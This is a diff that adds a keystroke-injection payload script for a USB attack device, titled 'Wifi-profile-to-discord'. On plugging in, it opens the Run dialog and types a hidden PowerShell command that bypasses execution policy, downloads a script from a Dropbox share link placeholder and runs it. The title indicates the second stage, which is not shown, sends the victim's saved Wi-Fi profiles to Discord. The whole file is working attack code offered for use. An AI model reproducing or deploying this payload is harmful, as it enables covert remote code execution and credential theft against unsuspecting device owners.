@@ -1,0 +1,14 @@
+REM Title:          Wifi-profile-to-discord
+REM Author:         JeffreyT72
+REM Description:    Upload ps1 file to dropbox and paste the share link under 'DROPBOX SHARE LINK HERE'
+REM                 remember to change the link to &dl=1
+
+ATTACKMODE HID
+
+DELAY 3000
+GUI r
+DELAY 250
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = Invoke-WebRequest 'DROPBOX SHARE LINK HERE'; invoke-expression $pl
+ENTER
+
+ATTACKMODE OFF
